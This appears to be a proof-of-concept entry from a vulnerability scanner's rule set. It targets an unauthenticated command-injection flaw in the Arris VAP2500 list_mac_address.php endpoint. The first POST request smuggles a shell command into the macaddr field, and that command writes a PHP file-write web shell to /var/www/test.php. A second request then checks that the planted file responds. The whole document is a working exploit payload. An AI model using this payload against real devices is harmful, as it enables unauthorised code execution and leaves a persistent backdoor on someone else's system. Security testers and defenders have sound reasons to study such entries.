{
        'name': 'Arris VAP2500 list_mac_address未授权RCE漏洞',
        'poc': [{'requests':{
            'method': 'post',
            'payload': '/list_mac_address.php',
            'headers': {
                'Accept-Encoding': 'gzip',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15(KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
                'Content-Type': 'application/x-www-form-urlencoded'

            },
            'data': """macaddr=00%3A00%3A44%3A00%3A00%3A00%3Becho+%27%3C%3Fphp+file_put_contents%28%24_POST%5B%22filename%22%5D%2C+%24_POST%5B%22content%22%5D%29%3F%3E%27%3E+%2Fvar%2Fwww%2Ftest.php&action=0&settype=1""",
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': False
        }},
        {'requests':{
            'method': 'get',
            'payload': '/test.php',
            'headers': {
                'Accept-Encoding': 'gzip',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15(KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
                'Content-Type': 'application/x-www-form-urlencoded'

            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': False
        }}
        ]
    }